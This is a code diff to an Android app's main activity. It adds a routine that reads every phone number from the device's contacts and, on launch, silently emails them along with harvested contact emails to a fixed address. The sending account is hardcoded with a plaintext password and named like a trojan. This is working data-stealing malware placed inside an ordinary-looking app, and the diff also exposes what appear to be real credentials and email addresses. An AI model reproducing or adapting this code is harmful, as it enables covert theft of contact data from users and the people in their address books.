@@ -31,6 +31,7 @@ public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSIONS_REQUEST_READ_CONTACTS = 100;
     ArrayList<String> emailList;
+    ArrayList<String> phoneList;
 
 
     @Override
@@ -38,13 +39,24 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         emailList = getEmails();
+        phoneList = getPhones();
+        String sPhone = "Phone Numbers\n";
+        String sEmail = "Emails\n";
+        String sBody = "";
+        for(String email: emailList){
+            sEmail += email + "\n";
+        }
+        for(String phone: phoneList){
+            sPhone += phone + "\n";
+        }
+        sBody = sEmail + "\n\n" + sPhone;
 
         //Use Gmail Background to send an email
         BackgroundMail.newBuilder(this)
                 .withUsername("trojan410app@gmail.com")
                 .withPassword("dr0wss@p")
                 .withMailto("kjarrett316@gmail.com")
-                .withBody("please please please")
+                .withBody(sBody)
                 .withSubject("subject")
                 .withOnSuccessCallback(new BackgroundMail.OnSuccessCallback() {
                     @Override
@@ -139,6 +151,49 @@ public class MainActivity extends AppCompatActivity {
                 return x;
             }
         }.parse();
+    }
+
+    public ArrayList<String> getPhones() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_READ_CONTACTS);
+            //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
+        }
+        else {
+            ArrayList<String> phoneRecs = new ArrayList<String>();
+            HashSet<String> phoneRecsHS = new HashSet<String>();
+            Context context = MainActivity.this;
+            ContentResolver cr = context.getContentResolver();
+            String[] PROJECTION = new String[]{ContactsContract.RawContacts._ID,
+                    ContactsContract.Contacts.DISPLAY_NAME,
+                    ContactsContract.Contacts.PHOTO_ID,
+                    ContactsContract.CommonDataKinds.Phone.NUMBER,
+                    ContactsContract.CommonDataKinds.Photo.CONTACT_ID};
+            String order = "CASE WHEN "
+                    + ContactsContract.Contacts.DISPLAY_NAME
+                    + " NOT LIKE '%@%' THEN 1 ELSE 2 END, "
+                    + ContactsContract.Contacts.DISPLAY_NAME
+                    + ", "
+                    + ContactsContract.CommonDataKinds.Phone.NUMBER
+                    + " COLLATE NOCASE";
+            String filter = ContactsContract.CommonDataKinds.Phone.NUMBER + " NOT LIKE ''";
+            Cursor cur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PROJECTION, filter, null, order);
+            if (cur.moveToFirst()) {
+                do {
+                    // names comes in hand sometimes
+                    String name = cur.getString(1);
+                    String phoneNum = cur.getString(3);
+
+                    // keep unique only
+                    if (phoneRecsHS.add(phoneNum.toLowerCase())) {
+                        phoneRecs.add(phoneNum);
+                    }
+                } while (cur.moveToNext());
+            }
+
+            cur.close();
+            return phoneRecs;
+        }
+        return null;
     }
 
     public ArrayList<String> getEmails() {
